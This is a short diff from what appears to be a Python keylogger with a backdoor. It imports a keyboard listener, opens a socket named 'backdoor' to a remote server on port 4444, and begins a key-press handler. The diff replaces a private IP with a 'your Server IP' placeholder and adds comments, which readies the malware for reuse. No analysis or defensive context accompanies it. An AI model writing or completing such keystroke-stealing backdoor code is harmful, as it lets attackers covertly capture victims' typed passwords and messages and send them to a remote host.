@@ -5,11 +5,11 @@ from pynput.keyboard import Listener, Key
 
 
 
-server_ip = '192.168.1.12'
-port = 4444
+server_ip = 'xxx.xxx.xxx.xxx' #your Server IP
+port = 4444 # Port No 
     
 backdoor = socket.socket()
-backdoor.connect((server_ip, port))
+backdoor.connect((server_ip, port)) #bind Ip and Port 
 
 
 def on_press(key):
